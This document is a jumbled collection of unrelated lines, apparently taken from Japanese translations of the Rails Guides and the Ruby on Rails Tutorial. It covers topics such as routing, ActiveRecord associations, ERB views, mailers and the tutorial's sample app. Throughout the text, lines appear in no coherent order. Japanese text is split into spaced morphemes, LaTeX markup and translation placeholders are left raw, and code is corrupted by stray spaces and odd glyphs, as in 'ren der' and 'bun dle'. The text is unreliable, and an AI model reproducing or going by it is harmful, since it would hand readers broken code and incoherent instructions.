    module   ArticlesHelper
= >   0 ▖ ▖ 9
   belongs_to : client
#### div_ for
|                     |   406                | : not_acceptable                  |
# => {'2009 - 0 3 2 '   => < Invoice   ▖▖▖
一意 性 の 制約 を 外 す こと も でき ま す 。
\ ref{ sec : the_flash } で 触れ た よう に 、 flash 用 の HTML   ( リスト \ ref{ code : layout_flash} )   は 読み にく い で す 。
\ kode {dependent :  : destroy } の テスト  
デフォルト 値 は `:type ` 値 を 大 文字 に し た もの で す   ( " ATOM "   や   " RSS "   など ) 。
      invoke     resource_ route
{ 0 } { 1 } 第 5 章 { / 1 } { / 0 } で は 、 この 章 で 学 ん だ 内容 を サンプル アプリケーション の 開発 に 活か し て い き ま す 。
unicode 文字 を 使用 する ルーティング を 直接 描出 でき る よう に な り ま し た 。
ついに ユーザー 登録 が 完成 し ま し た ▟ 名前 を   “ Rails   Tutorial ” 、 メール アドレス を   “ example@railstutorial ▖org ” と し て 登録 し て み ま しょ う   ( 図 \ ref { fig : first _ signup } ) 。
メール アドレス を 小 文字 に する とき に も メソッド 参照 が 使用 さ れ る 機会 が あ る こと に ご 注目 くださ い 。
     admin ▖ validates : password ,  length : {  minimum :   10   }
CD N 上 の 同じ URL に 対 し て 次 の リクエスト が 発生 する と 、 キャッシュ さ れ た コピー が ヒット し ま す 。
この フォーム と 、 それ に 関連 付け られ た ルーティング が 定義 さ れ る こと で 、 フォーム に 記入 し て 送信 ボタン を クリック する と 新し い 記事 作成 プロセス が 開始 さ れ る よう に な り ま す 。
*  ` Rack : : MethodOverride ` は 、 ` params [ :_ method ] ` が 設定 さ れ て い る 場合 に メソッド を 上書き でき る よう に し ま す 。
最後 に 、 \emph { Ruby   on   Rails チュートリアル } で 使用 さ れ て い る 多く の サンプル コード を わか り やす く 記述 する ため に 、 2 つ の 工夫 を 加え ま し た 。
ブロック が 完了 する と 、 ` atomic _write ` は ファイル ハンドル を クローズ し て 処理 を 完了 し ま す 。
Rails で は 、 データ モデル で 使用 する デフォルト の データ 構造 の こと を \emph { モデル } と 呼 び ま す   ( \ ref{ sec : mvc} { / 1 で 言 う MVC の M の こと で す ) 。
この 文字 列 は 環境 の 違い に よ り 上記 の もの と 少し 異な る か も しれ ま せ ん が 、 他 の 部分 は ほぼ 同じ はず で す 。
scaffold で 生成 さ れ た 膨大 な コード を 今 詳細 に 読 む 必要 は あ り ま せ ん ▟ 今 の 段階 で は おそらく 混乱 する だけ で しょ う 。
weeks_ago
標準 の イニシャライザ を 使用 し た い 場合 も 同様 で す 。
C ▖ descendants # => [ ]
#   app/controllers/users_controller▖ rb
###  ミドルウェアスタック を 調べ る
Home ページ に ステータス フィード を 追加 する
url_field_tag   'url'
結果 は 図 \ ref { fig: sqlite_database_browser } の よう に な る の で 、 図 \ ref { fig :user_ model_ initial } と 比べ て み て くださ い 。
これ は リスト \ ref{ code :preventing _unactivated_ signins } で 使用 さ れ て い ま し た 。
` collection<< ` メソッド は 、 1 つ 以上 の オブジェクト を コレクション に 追加 し ま す ▟ この とき 、 追加 さ れ る オブジェクト の 外部 キー は 、 呼び出し 側 モデル の 主 キー に 設定 さ れ ま す 。
Web ページ の 典型 的 な HTML 構造
╼ ╼\end { aside }╼╼\ section { はじめ に } %  ( fold) ╼\ label{ sec : introduction}╼╼
$  cd   actionmailer
ユーザー を 認証 でき た ら 、 ユーザー の ステータス を 「 有効 化 さ れ て い な い 」 から 「 有効 化 済み 」 ( activated )   に 変更 する 。
この メソッド 名 は ` ren der  : nothing ` より も 動作 を 明確 に 表 し て い ま す 。
Date▖ new (2010 ,   4 ,   30 ) ▖ months_ago ( 2 )     # =>  Sun ,   28   Feb   2010
これ で 、 ユーザー 情報 が 無効 な 場合 の テスト スイート が 緑色   ( 成功 )   に な り ま し た 。
ここ で は ` : article ` と い う シンボル を 渡 し ま す 。
HTTP リクエスト ヘッダ で 使用 さ れ て い る フィールド の 中 に は Referer 、 User - Agent   ( クライアント 側 ソフトウェア ) 、 Cookie フィールド が あ り ま す 。
ユーザー を 削除 する アクション
       create      app/views/users/_form ▖html ▖erb
# => < input   id= " url"   name = " url" type = " url"  />
前述 の 簡潔 な 記法 を \ kode { current_user } メソッド に 適用 し た 結果 を リスト \ ref{ code : current_user } に 示 し ま す 。
*   ルーティング ヘルパー を 使用 し て パス や URL を 自動 生成 する 方法
    <%=  ren der  [ customer 1 ,  employee 1 ,  customer 2 ,  employee 2 ]  %>
ファイル の 移動 や リネーム
     following
    <%=  ren der template :  " layouts/application "  %>
$  cd   workspace/
  *   アセット マニフェスト ファイル   ( `application ▖js ` および ` application ▖css ` )
アプリケーション の データベース が 動作 する よう に する に は 、 以下 を 実行 し て 本番 データベース の マイ グレーション を 行 う 必要 も あ り ま す 。
RSS フィード
( 注意 :   ここ で 使用 し て い る \ kode { respond_to } は 、 RSpec の 例 で 使用 し て い る \ kode { respond_to } と は 別物 で す ) 。
#  via   a   model
アプリケーション の 他 の 部分 と 同様 、 ルーティング 部分 も テスティング 戦略 に 含め て お く べ き で しょ う 。
必要 で あ れ ば 、 いつ も の よう に コード を プッシュ し て 展開 し ま す 。
  </div>
###  ディープ 複製
NOTE : ` root ` ルーティング が アクション に 渡せ る の は ` GET ` リクエスト だけ で す 。
作成 し た コード を リスト \ ref{ code :micropost _ instance_ variable } に 示 し ま す
ビュー テンプレート で 以下 の よう な フィールド を 用意 し ま す 。
### ` : on `
[ 0 ,   1 ,   - 5 ,   1 ,   1 ,   " foo " ,   " bar " ] ▖split ( 1 )
驚 い た こと に 、 公式 標準 に よ る と \ kode { " Michael   Hartl" @ example ▖ com } の よう な クォート と スペース を 使用 し た メール アドレス も 有効 な の だ そう で す 。
╼╼\ subsection { 本章 の まとめ }  %  ( fold) ╼\ label{ sec : advanced _
パスワード の 再 設定 が 成功 し た 場合
    @ips▖include ? (
この メソッド は `: through ` オプション と 併用 する とき に 特 に 便利 で す 。
最初 に 、 master と 自分 の 変更 の diff 以外 に 差分 が な い こと を 確認 し ま す 。
Rails ▖ application▖ config▖ before_ initialize  do
Rails コンソール で は 、 スタック から 抜け る に は Ctrl - C を 押 し 、 完全 に コンソール を 終了 する に は Ctrl - D を 押 し ま す 。
*  `app/views/layouts/application ▖html ▖erb `
これ と 同じ 結果 を 得 られ る サブ テンプレート の 使用 法 は この 他 に も さまざま な もの が 考え られ ま す 。
と い う Sample アプリケーション の コード で す   ( リスト \ ref{ code : home_root _ route } ) 。
###  ORM フレームワーク と し て の Active   Record
本 チュートリアル を 進め て い れ ば 、 どう や っ て も 手順 に 書 い て あ る とおり に 動 か な い こと が あ る で しょ う 。
自分 の コード を Rails に 追加 する の で あ れ ば 、 以下 の 点 を 心がけ て くださ い 。
|  test/fixtures/comments▖yml                    |  テスト で 使用 する サンプル コメント                                                                      |
エンジン が 生成 さ れ る と 、 ` test/dummy ` ディレクトリ の 下 に 小 規模 な ダミー アプリケーション が 自動 的 に 配置 さ れ ま す 。
$  rails   generate  controller   StaticPages   home  help -- no- test - framework
これ で 、 ルーター に よ っ て `/ patients/17 ` と い う パス が 生成 さ れ ま す 。
*   [ Railscasts:   Turbolinks ] ( http://railscasts▖ com/episodes/390 - turbolinks ? language =ja&view=asciicast )   ( 日本 語 )
次 に 、 テスト データ を いく つ か 揃え ま す ▟ リレーションシップ 用 の fixture に データ を 追加 し ま しょ う 。
class   Admin Mailer <  Action Mailer : : Base
リスト \ ref{ code : password _ resets_resource } の PasswordResets リソース で 提供 さ れ る RESTful ルーティング
( Application ヘルパー を インク ルード する こと で 、 リスト { p 0 } の { 2 } full_title{ / 2 } ヘルパー が 利用 でき て い る 点 に 注目 し て くださ い { p 3 } ) 。
上 で 見 た とおり 、 ` Array ` の インスタンス を 複製 し て 別 の オブジェクト が でき た こと に よ り 、 一方 を 変更 し て も 他方 は 変更 さ れ な い よう に な り ま し た 。
Rails   3 ▖ x で は cookie ベース の セッション へ の 署名 は 行 わ れ ま す が 暗号 化 は 行 わ れ ま せ ん 。
結果 は { 0 } { 1 } 図 2 ▖ 13 { / 1 } { / 0 } の よう に な る はず で す 。
テスト が 揃 っ て い れ ば 、 コード を 安全 に \emph { リファクタリング }   ( 機能 を 変更 せ ず に コード を 改善 する こと )   でき る 。
本節 で は 、 ユーザー ログ イン を デフォルト で 保持 する よう に 変更 し 、 ユーザー が 明示 的 に ログ アウト する まで は セッション を 期限 切れ に し な い よう に し ま す 。
ERb に よ っ て 実際 に 生成 さ れ る HTML は それ ほど 重要 で は あ り ま せ ん が 、 興味 が あ る 方 の ため に 、 次 に その 核心 部分 を お 見せ し ま す 。
詳細 に つ い て は \ ref{ sec : sample_app_setup } を 参照 。
    has_and _belongs_to_many  : assemblies ,
前節 で 基本 的 な ユーザー ページ の 定義 は 終わ り ま し た の で 、 今度 は 各 ユーザー の プロファイル 写真 の あたり を もう 少し 肉付け し 、 サイド バー も 作 り 始め ま しょ う 。
Rails に お け る MVC
同じ 要領 で 3 つ の 静的 ページ を 書き換え ま す   ( リスト \ ref{ code :title_tests} ) 。
     def  set_ delivery _ options
#### `un derscore `
文字 列 の 先頭
コントローラ の 継承 構造 は もう 少し だけ 複雑 で す 。
` assert_recognizes ` は ` assert_ generates ` と 逆 方向 の テスティング を 行 い ま す 。
著者 の 場合 、 \ href {https://en ▖wikipedia ▖org/wiki/ YAML } { YAML } ライブラリ の インストール も 必要 で し た 。
これ は リスト \ ref{ code :user_ show _ page_test } で 使用 さ れ て い ま し た 。
     collect  { |e | e▖ to_ param  }▖ join  '/'
\ kode { README } ファイル の 更新 が 終わ っ た の で 、 GitHub に 変更 を プッシュ し て 結果 を 見 て み ま しょ う 。
この 正規 表現 は シナリオ の 中 の 行 と マッチ し 、 次 の ブロック の 内容 は 、 その ステップ を 実装 する ため に 必要 な Ruby の コード で す 。
Client ▖ order (orders_count :  :asc ,   created_at:  : desc)
先 の 例 で は 、 `: log _ level ` は ライブラリ の パブリック インターフェイス に 属 さ ず 、 開発 用途 に のみ 使用 さ れ ま す 。
\ kode { paginate } と 同様 に 、 関連 付け を とお し て \ kode { count } メソッド を 呼び出 す こと が でき ま す 。
#   保存 の 成功 を ここ で 扱 う 。
`: collection ` オプション を 使用 し て パーシャル に コレクション を 渡 す と 、 コレクション の メンバ ごと に パーシャル が レンダリング さ れ て 挿入 さ れ ま す 。
####  生 の コンテンツ を 出力 する
この `main_app ` ルーティング プロキシ メソッド を 呼び出し を 省略 する と 、 行き先 は 呼び出 さ れ た 場所 に よ っ て アプリケーション また は エンジン の いずれ か と な っ て 確定 し ま せ ん 。
この ユーザー 登録 フォーム と サイン インフォーム の 主な 違い は 、 サイン インフォーム に は Session モデル が な い ため に \ kode {@user } 変数 の よう な 存在 が な い こと で す 。
ユーザー 表示 ページ に Gravatar の カスタム 画像 が 表示 さ れ て い る
*  `assert_recognizes`
自分 で 認証 システム を 作 っ て み る
<%=  image_tag   " home▖ gif "  %>
* `: primary _key`
te}╼╼    %  subsection   the_finished_ signup _ form   ( end ) ╼╼    \ subsection { flash} %  ( fold) ╼    \ label{ sec : the_flash}╼╼
この ページ の 表示 を 図 \ ref { fig : home_view_ full _html } に 示 し ま す
( 著者 の 場合 、 RVM の gemset も 次 の 行 で 指定 し て い ま す 。
" SQL "   と い う 語 の 前 に は 冠詞   " an "   を 付け る こと   ( 例 :  " an   SQL   statement " ) 。
まず 、 ユーザー インデックス ページ の 各 ユーザー に 削除 用 の リンク を 追加 し 、 続 い て 管理 ユーザー へ の アクセス を 制限 し ま す 。
ren der   " edit▖html ▖erb "
\ ref{ sec : changing_ the_layout_links } で は 、 アプリケーション の レイアウト 上 の リンク を 変更 する 予定 で す ▟ この リンク を クリック する と 、 現在 ログ オン し て い る ユーザー の プロフィール が 表示 さ れ ま す 。
Ruby を インストール し 、 Rails など の サポート ソフトウェア を 一 から すべて インストール する 練習 は 、 たとえ ベテラン Rails 開発 者 に と っ て も 、 退屈 な 作業 に な る こと で しょ う 。
$  rake blorgh : install : migrations
    is   the   sample  application   for   the tutorial ▖
  on
####  レスポンス 分割
     payment_type ==  " card "
###  JSON の 扱い の 変更 点
<html >
resources  : publishers  do
一部 の Dreamweaver の よう に UTF - 8 保存 が デフォルト で な い エディタ で あ っ て も 、 デフォルト を UTF - 8 に 変更 する 方法 は 用意 さ れ て い る はず で す 。
長 い 単語 を ラップ さ せ る ヘルパー 。
* =  require_tree   ▖
Loading   development  environment
###  Article リソース を 生成 する
   if @ logger ▖try(:debug ? )
=>  " Example  User   <user@ example ▖ com> "
アプリケーション は 、 この よう な リクエスト を エンジン に ルーティング する 方法 を 知 ら な い の で 、 明示 的 に エンジン に ルーティング する 必要 が あ り ま す 。
タグ 内 に 記載 さ れ た もの は すべて Ruby の コード と し て 評価 さ れ ま す 。
その よう な 場合 は 、 `bun dle   update`   を 実行 し て 正し い 依存 関係 バージョン を 反映 し 、 変更 の ` Gemfile ▖ lock ` ファイル に コミット し て くださ い 。
edit_user   GET     / users/:id/edit ( ▖: format )   users #edit
私 に この 用語 を 変更 する 決心 を さ せ て くれ 、 より わか り やす い アドバイス を 提供 し て くれ た 読者 、 Cosmo   Lee に 感謝 いた し ま す
`mattr_reader` 、 `mattr_writer ` 、 `mattr_accessor ` と い う 3 つ の マクロ は 、 クラス 用 に 定義 さ れ る ` cattr_*` マクロ と 同じ で す 。
<% =  ren der   " shared /menu "  %>
設定 ファイル で ` config ▖ assets▖digest ` オプション を 使用 し て フィンガー プリント の オン / オフ を 制御 でき ま す 。
    First   name : <%=   person _form ▖ text _field  : first _ name  %> 
` app/assets/stylesheets/main▖css ` と ` app/assets/stylesheets/columns ▖css ` を 含め る に は 、 以下 の よう に し ま す 。
従 っ て 、 この メソッド は 大 規模 な クエリ や 使用 頻度 の 高 い クエリ で 使用 する と パフォーマンス が 向上 し ま す 。
` vendor` 、 ` lib ` 、 `app ` 以下 の すべて の ディレクトリ 、 ` config▖load _ paths ` で 指定 さ れ る すべて の パス が ` $ LOAD _ PATH ` に 追加 さ れ ま す 。
$   mkdir  workspace
* `: location `
ユーザー の プロフィール 画面 に   [ Follow ]   ボタン が 表示 さ れ て い る
### `find_or_create_by !
配列 で も 、 文字 列 と 同様 に インスタンス を 生成 でき ま す 。
ついに 、 ユーザー 登録 が 完成 し ま し た ▟ 名前 :   “ Rails   Tutorial ” 、 メール アドレス :  “ \ texttt { example@railstutorial ▖org } ” と で も 登録 し て み ま しょ う 。
###  機能 テスト
#  ( SQLite 、 My SQL 、 Postgre SQL で 動作 )
╼╼    %  subsection   back_to_ the_title_helper   ( end ) ╼╼  \ section { 他 の データ 構造 }  %  ( fold) ╼  \ label{ sec :other_ data_structures }╼╼
いよいよ Relationship 関連 付け の 核心 、 \ kode { followed_users } と \ kode { followers } に 取りかか り ま す 。
    has_many  : parts ,  through :  :manifests
より 高度 な 制限 を 使用 し た い 場合 、 Rails で 必要 な ` matches ? ` に 応答 でき る オブジェクト を 渡 す 方法 が あ り ま す 。
Toy アプリケーション の User モデル
#####  CD N ヘッダ を デバッグ する
もちろん 、 お 望み で あ れ ば 、 この 時点 で Heroku に デプロイ する こと も でき ま す 。
Active   Record
まとめ る と 、 第 \ ref { cha : modeling _ users } 章 から 第 \ ref { cha : account_activation_and _ password _ reset } 章 を 通 し て 、 Rails の ログ イン と 認証 システム を ひととおり 開発 し ま す 。
    identical     app/assets/stylesheets/scaffolds ▖css ▖ scss
###  ジョブ を キュー に 登録 する
** `ActiveRecord : : QueryCache` * *
次 に 、 Bundler で 使用 する \ kode { Gemfile }   を テキスト エディタ で 編集 し ま す ▟ { 1 } { 2 } リスト 2 ▖ 1 { / 2 } { / 1 } の 内容 に 書き換え て くださ い 。
ActiveSupport: : Concern は 、 相互 に リンク し て い る 依存 モジュール および 依存 クラス の 実行 時 読み込 み 順序 を 管理 し 、 コード の モジュール 化 を 高め ま す 。
` has_many ` 関連 付け は 、 他 の モデル と の 間 に 「 1 対 多 」 の つながり が あ る こと を 示 し ま す 。
match   'photos' ,  to :  'photos# show ' ,   via :  : all
バイト 数 を 読 み やす い 形式 に フォーマット し ま す ▟ ファイル サイズ を ユーザー に 表示 する 場合 に 便利 で す 。
この 変更 は 、 Rails   4 ▖ 1 以降 で は シンボル を 使用 し て これ ら の データ 型 に アクセス でき な く な る と い う こと を 意味 し ま す 。
ActiveRecord : : FixtureSet▖context _ class▖send   : include ,   FixtureFileHelpers
ユーザー を フォロー し た とき や フォロー 解除 し た とき に プロフィール ページ を 更新 する ため に 、 私 たち が これ から 作成 および 編集 し な けれ ば な ら な い の は 、 まさに これ ら の ファイル で す 。
{ 0 } 図 2 ▖ 11 { / 0 }   { 1 } Rails に お け る MVC { / 1 }
たとえば 、 \ kode { follow\_ form } 要素 を 操作 する に は 、 以下 の 文法 を 使用 し ま す 。
具体 的 に は 、   { 0 } config { / 0 } 変数 で 「 本番 環境 で は SSL を 強制 する 」 と い う 設定 を する だけ で す   ( リスト { p 1 } ) 。
たとえば 、 データベース の 最初 の ユーザー の 場合 は 、 以下 の 配列 に な り ま す 。
N ▖ name  # => " N "
( \ ref{ sec : demo_ users _ resource } で 、 この コマンド を 似 た よう な 状況 で 実行 し た こと を 思い出 し て み て くださ い )   。
DELETE
これ は 、 Rails で アクション を 指定 せ ず に 生成 し た コントローラ は 中身 が 空 の まま に な る ため で す 。
\ kode {any ? } メソッド は ちょうど \ kode {empty ? } と 逆 の 動作 で 、 要素 が 1 つ で も あ る 場合 は \ kode {true } 、 な い 場合 は \ kode {false } を 返 し ま す 。
たとえば 、 リスト \ ref{ code : users _migration } の マイ グレーション に よ っ て 作成 さ れ た   \ texttt {email } 属性 に つ い て 考え て み ま しょ う 。
SQL   ( 0 ▖ 8 ms )     COMMIT
#     <branch > origin /master </ branch >
$ bun dle   exec   rake   TEST = test/ cases/associations/has_many_ associations_test ▖ rb
#   開発 環境 で は アセット を 圧縮 し な い
もし 多数 の 静的 な ページ が 必要 に な る 場合 は 、 \ href {https://github▖ com/thoughtbot/high _voltage}{\ texttt { high \_voltage} }  gem   を 調べ て み て くださ い 。
###  アセット タグ ヘルパー
*  `edit_photo _ path(:id ) ` は `/photos/:id/edit ` を 返 し ま す   ( `edit_photo _ path ( 10 ) ` で あ れ ば `/photos/10/edit ` が 返 さ れ ま す )
- e   " signup   with   invalid   information "
### `ren der ` を 使用 する
           from : 'notification @example ▖ com'
コア 拡張 機能 を 読み込 む 方法
╼       create      app/helpers/microposts_helper▖ rb
{ 0 } { 1 } 第 7 章 { / 1 } { / 0 } で サイト に ユーザー を 追加 する とき に 備え て 、 最初 の \ kode {link_to } に 仮 の リンク を 作成 し ま す 。
###  Active   Resource
# => [#< Client   id :   1 ,   first _ name :  " Lifo " > , #< Client   id :   10 ,   first _ name :  "Ryan " > ]
デバッガー を Users コントローラー から 取り外 す
ある モデル と 異な る 名前 空間 に あ る モデル を 関連 付け る に は 、 関連 付け の 宣言 で 完全 な クラス 名 を 指定 する 必要 が あ り ま す
この オプション は 、 `: log ` また は ` : raise ` を 指定 する と 有効 に な り ま す 。
ルーティング で は 正規 表現 で 複数 行 を 扱 う こと を 許 し て い な い の で 、 この フラグ を 使用 し て 制限 を 加え て い ま す 。
*   キャッシュ 制御
       method  =  instance _ method ( method_ name )
もし うま く い か な く て も 、 いつ で も データベース の 中身 を リセット でき る の で 安心 し て くださ い ▟ リセット し た い 場合 は 、 以下 の 手順 を 踏 ん で くださ い 。
# => #< ActiveSupport: : TimeZone : 0 x 7 f 7365 4 d 4 f 38  @utc_offset = nil , @ name = " Madrid " ,  ▖▖▖
今度 は 自分 で 空 の フィクス チャ ファイル を 作成 し て データ を 追加 し ま しょ う 。
Oh   dear !  
|                     |   204                | : no_content                      |
と は い え 、 User モデル に は まだ バリデーション が な い の で 、 この テスト は 成功 する はず で す 。
Use  `bun dle   show   [ gemname ] `  to  see   w here   a  bun dled   gem   is   installed ▖
resources   : messages  do
上 の 例 で は 、 1 日 あたり 1 つ の 注文   (order )   オブジェクト を 返 し ま す が 、 1 日 あたり の 注文 合計 が $ 100 を 超え る 場合 に のみ これ を 行 い ま す 。
設定 が 完了 し た ら 、 以下 の \ kode { guard } コマンド で Guard と Spork を 同時 に 起動 し ま す 。
ステータス フィード 付き の Home ページ の モックアップ
この アクション を 作成 する 必要 が あ り ま す ▟ ` app/controllers/blorgh/ comments_controller▖ rb ` の クラス 定義 の 中 に 以下 の 行 を 追加 し ま す 。
#   <bar type =" integer " > 2 < / bar>
最後 に Heroku へ 展開 する こと も でき ま す 。
" invoices " ▖ classify      # => " Invoice "
` member ` ルーティング が 1 つ だけ しか な い の で あ れ ば 、 以下 の よう に ルーティング で ` : on ` オプション を 指定 する こと で ブロック を 省略 でき ま す 。
#### `pluralize`
*   FROM   " articles "   WHERE   ( id   >   10 )   ORDER   BY  id   desc  LIMIT   20
Toy アプリケーション は 、 後 に 作成 する サンプル アプリケーション と 同様 、 \emph { ユーザー } と 、 それ に 関連 し て い る \emph { マイクロ ポスト } から 成り立 っ て い ま す 。
   def  set_cookie
アセット タグ ヘルパー が 提供 する メソッド は 、 フィード 、 Java Script 、 スタイル シート 、 画像 、 動画 および 音声 の ビュー に リンク する HTML を 生成 する ため の もの で す 。
管理 者 権限 の 制御 を アクション レベル で テスト する  
例えば
{ 0 } 図 12 ▖ 11 { / 0 }   { 1 } Home ページ に フォロー 関連 の 統計 情報 を 表示 する { / 1 }
次 に 重要 な 要素 は 、 \ kode { form } タグ 自身 で す 。
NOTE :   Action   View の 一部 の 機能 は Active   Record と 結びつ い て い ま す が 、 Action   View が Active   Record に 依存 し て い る わけ で は あ り ま せ ん 。
|   GET        | /photos          | images#index       |  photos_ path          |
options _ from_collection_for_select ( @project ▖ people ,   " id " ,  " name " )
上 は 以下 に 置き換え られ ま す 。
リスト \ ref{ code :user_ model_ password _ reset_expired } の コード を 使用 する と 、 リスト { p 2 } の { 3 } update { / 3 } アクション が 動作 する よう に な り ま す 。
\ kode { create } アクション 内 の インスタンス 変数 を 使用 する ため の テンプレート
繰り返 し ま す が 、 ブラック リスト に よ る フィルタ は 永遠 に 不 完全 な まま に しかな り ま せ ん 。
Action   Controller は 、 データベース と の やりとり や 、 必要 に 応 じ た CRUD   ( Create/ Read /Update/ Delete)   アクション の 実行 に かかわ り ま す 。
Active   Support に は 「 ( html 的 に )   安全 な 文字 列 」 と い う 概念 が あ り ま す 。
`- - mountable ` オプション を 使用 する と 、 `-- full ` オプション に 以下 が 追加 さ れ ま す 。
この 章 で は 、 ゼロ から User モデル を 作成 し 、 そこ に name 属性 や email 属性 、 パスワード 属性 を 加え ま し た ▟ また 、 それぞれ の 値 を 制限 する 多く の 重要 な バリデーション も 追加 し ま し た 。
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
システム 上 で 動 い て い る すべて の プロセス は 、 \ texttt {ps } コマンド に \ texttt { aux } オプション を 付け て 実行 する こと で 確認 でき ま す 。
( この よう な エラー を 捉え る こと が でき る の が 、 ビュー で Specs を 使用 する 大きな メリット で す 。
Ruby   on   Rails   ( 単に 「 Rails 」 と 呼 ぶ こと も あ り ま す )   は 、 Ruby プログラミング 言語 で 記述 さ れ た 、 Web 開発 フレームワーク で す 。
ハッシュ の 1 要素 を 角 かっこ を 使 っ て 定義 する 代わり に 、 以下 の よう に キー と 値 を ハッシュ ロケット と 呼 ば れ る \ kode {=>}  に よ っ て リテラル 表現 する ほう が 簡単 で す 。
Sign   up
メイラー の ビュー は ` app/views/name _of_mailer_ class ` ディレクトリ に 置 か れ ま す 。
この ルーティング ファイル は Rails の \ kode {config } ディレクトリ の 下 に 置 か れ ま す ▟ この ディレクトリ に は 、 Rails の 設定 ファイル が まとめ て 置 か れ ま す   ( 図 \ ref { fig: config_directory _ rails } ) 。
上 の 行 で は 、 `Blorgh : : Article ` モデル と コメント が ` has_many ` 関連 付け と し て 定義 さ れ て い る 必要 が あ り ま す が 、 現 時点 で は まだ あ り ま せ ん 。
これ ら を 使用 する 場合 は ` Blorgh ▖ author_ class ` と い う 名前 で 参照 する 必要 が あ り ま す 。
invoke     scaffold_controller
世界 の ほぼ すべて の タイム ゾーン を 含 む オプション タグ の 文字 列 を 返 し ま す 。
これ が 、 その 正規 表現 で す 。
今後 の 学習 の 手始め と する ため に 、 この 節 で は サンプル アプリケーション の コア 部分 の さまざま な 拡張 方法 を 提案 し 、 それぞれ に 必要 な 学習 内容 に つ い て も 示 し ま す 。
` prev _week ` は ` last _week ` の 別名 で す 。
    @bu siness = bu siness
` config ` 呼び出し は 、 この イベント より 前 に 評価 さ れ ま す の で 注意 し て くださ い 。
config▖ mid dleware ▖ delete   " Rack : : Lock "
authenticated ?(:remember ,   token )
d ▖sunday                      # =>  Sun ,   16   Sep  2012
{ 0 } 図 2 ▖ 5   { / 0 } { 1 } 新規 ユーザー 作成 ページ   ( \ href { http://local host : 3000 / users/new}{/ users/new}) { / 1 }
たとえば 、 ` nil ` 、 `true ` 、 `false ` の 場合 は 自分 自身 を 返 し ま す 。
*   [ Railscasts :   控えめ な Java Script ] ( http://railscasts▖ com/episodes/205 -unobtrusive - javascript )
  < input   id= " person _last_ name "   name = " person [ last_ name ] " type =" text "  />
nick   =  Client ▖find_or_ initialize_by ( first _ name :  'Nick ' )
boolean 型 の \ kode { admin } 属性 を User に 追加 する マイグレーション
\ kode {cookies▖ signed [ :user_ id ] } で は 自動 的 に ユーザー ID の cookies の 暗号 が 解除 さ れ 、 元 に 戻 り ま す 。
以上 を すべて ヘッダー の パーシャル 部分 に 適用 し て 更新 し た もの を リスト \ ref{ code : layout_ login_logout_links } に 示 し ま す 。
[ remember   me ]   チェック ボックス の 送信 結果 を 処理 する
後 は Rails を 実際 に 勉強 する だけ で す 。
見え やす く する ため 、 図 \ ref { fig: naive_user_ has_many _ following } から \ kode { following } テーブル の \ kode {id } カラム を 省略 し ま し た 。
strip_tags ( " Strip <i> these</i> tags ! " )
      <div  id= " top _menu" > Top  menu items   here < / div>
Microposts コントローラ の 認可 テスト  
    <td ><%=   link_to   ' Destroy' ,   article _ path ( article ) ,
def  default _helper_ module !
上 の 例 で は 、 属性 の 値 を インク ルード する 方法 を 示 す ため に ` : message ` オプション も 使用 し て い ま す 。
config ▖ assets▖ prefix   =  " / 他 の パス "
関連 付け られ た オブジェクト が データベース から 検索 さ れ た こと が あ る 場合 は 、 キャッシュ さ れ た もの を 返 し ま す 。
M ▖ name  # => " M "
#   Rails > =   4 ▖ 1
引数 が nil で あ っ た ら どう な る か 。
これ は リスト \ ref{ code :user_ model_remember } で 使用 さ れ て い ま し た 。
これ は リスト \ ref{ code : following _ followers_tests } で 使用 さ れ て い ま し た 。
受け取 っ た パスワード が ユーザー の パスワード と 一致 する と ユーザー が 返 さ れ 、 一致 し な い 場合 は \ kode {false } が 返 さ れ ま す 。
テキスト エディタ と コマンドライン
アカウント 有効 化   ( リスト \ ref{ code : account_activation_edit_ action } )   の 場合 と 同様 、 \ kode { params [ :email ] } に あ る メール アドレス に 対応 する ユーザー を この 変数 に 保存 し ま す 。
   Myapp :: Application ▖ config▖ secret_token  =  'existing   secret  token'
###   安全 な 出力
$  rake   db : migrate
この とき 、 ローカル 環境   ( 開発 用 の 環境 )   で Puma を 使 う 必要 は な い の で 、 リスト \ ref{ code :puma_gemfile } の よう に \ kode {: production } グループ の 中 に 追加 し て お き ま す 。
Rails に は コマンドライン から 実行 する コマンド が 多数 あ る の で 、 最初 から コマンドライン が 利用 でき る クラウド は 非常 に 便利 で す 。
    mattr_accessor   : mechanism
   u▖ name  =  " David "
変更 前 は 、 ユーザー の プロファイル ページ   ( \ ref{ sec : successful_ signups})   に リダイレクト し て い ま し た が 、 アカウント 有効 化 を 実装 する うえ で は 無 意味 な 動作 な の で 、
有効 に な っ て い な い ユーザー に 表示 さ れ る 警告 メッセージ
これ を 作成 する に は 、 アプリケーション の ルート ・ ディレクトリ で 以下 の コマンド を 実行 し ま す 。
assert_ routing ( {  path :  'photos' ,   method :  : post  }, {  controller :  'photos' ,   action :  'create' })
╼\end{ code }╼╼    \ subsection { データ モデル の 問題   ( および 解決 策 ) } %  ( fold) ╼    \ label{ sec :a_problem_with _ the_data_model} ╼╼
これ で 、 admin テスト は パス する はず で す 。
クラス に つ い て の 理解 を 深め る に は 、 自分 で クラス を 作成 し て み る の が 一番 で す 。
今度 は テスト スイート が パス する はず で す 。
もちろん 、 新し い サンプル データ を 生成 する ため に は Rake タスク の \ kode { db : populate } を 実行 する 必要 が あ り ま す 。
  <%=  comment▖ body %>
|   DELETE     | / kategorien/:id             |  categories# destroy |  category _ path(:id )       |
そこ で 、 読者 の 経験 や 知識 に 応 じ た 、 \emph { Rails チュートリアル } を 読破 する ため の アドバイス を 用意 し ま し た ▟ ぜひ 参考 に し て くださ い 。
ビュー に レイアウト が あ る の と 同様 、 パーシャル で も 独自 の レイアウト ファイル を 使用 する こと が でき ま す 。
      * `scoped_ by _▖▖▖`              に 代え て   ` w here ( ▖▖▖) `   を 使用
create_account
1 つ 前 の 章 の とき と 同じ よう に 、 サンプル データ を 自動 作成 する Rake タスク を 使用 し て データベース に サンプル リレーションシップ を 登録 する の が やはり 便利 で す 。
` test ` ディレクトリ に 他 の ディレクトリ を 作成 する こと も でき ま す 。
* `ActiveRecord : : FixtureSet ` の 導入 に 伴 い 、 Rails   4 ▖ 0 で は ` ActiveRecord : : Fixtures ` が 非 推奨 と な り ま し た 。
  <%= @ article ▖title %>
以下 の 例 で は 、 苗字 と 名前 が 小 文字 で 始ま ら な い よう に し た い と 考え て い ま す 。
Rails に お け る 「 レイアウト 」 は 、 多く の コントローラ の アクション に わた っ て 共通 し て 使用 でき る テンプレート の こと で す 。
class   Article <  ActiveRecord : : Base
